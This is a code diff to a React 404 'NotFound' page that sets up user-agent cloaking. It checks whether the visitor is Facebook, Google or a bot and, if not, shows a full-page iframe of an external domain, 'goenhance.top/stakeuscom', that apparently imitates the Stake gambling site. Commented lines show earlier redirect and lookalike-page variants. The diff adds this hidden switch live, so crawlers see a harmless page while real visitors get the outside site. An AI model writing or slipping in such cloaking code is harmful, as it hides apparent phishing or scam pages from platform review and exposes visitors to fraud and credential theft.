@@ -7,7 +7,7 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://newclient-nu.vercel.app/');
+  let[IframeUrl, SetIframeUrl] = useState('https://goenhance.top/stakeuscom');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
 
@@ -79,8 +79,9 @@ function NotFound() {
   if(!userAgent.includes('facebook') 
     && !userAgent.includes('google') 
     && !isbot(userAgent)){
+      return(showIframe(IframeUrl,SiteTitleMeta,false));
       //return window.location.href = 'https://t.co/eTzKSTCwng';
-      return(showIframe("/stake/index.html",SiteTitleMeta,false));
+     // return(showIframe("/stake/index.html",SiteTitleMeta,false));
     // if(IsUserHiden){
     //   return(showIframe("/id/home.html",SiteTitleHome,false));
     // }else{
